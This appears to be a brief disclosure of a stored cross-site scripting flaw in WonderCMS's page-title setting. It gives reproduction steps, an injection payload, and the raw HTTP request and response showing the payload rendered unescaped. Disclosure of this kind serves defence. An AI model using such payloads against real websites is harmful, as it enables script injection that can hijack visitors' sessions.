### Stored XSS

Steps to Reproduce:

1. Login and browse to "Settings"
2. "Current Page" > "Page Title"
3. Input following payload into "Page Title" ```"><a onmouseover=alert(1) style=display:block>XSS</a>```

```
// HTTP POST request

POST /wondercms HTTP/2
Host: 192.168.232.133
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
[...]


[...]content=%22%3E%3Ca%20onmouseover%3Dalert(1)%20style%3Ddisplay%3Ablock%3EXSS%3C%2Fa%3E&target=pages&menu=&visibility=
```
```
// HTTP response

HTTP/2 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
[...]

[...]
	<meta name="title" content="Website title - "><a onmouseover=alert(1) style=display:block>XSS</a>" />
[...]
```
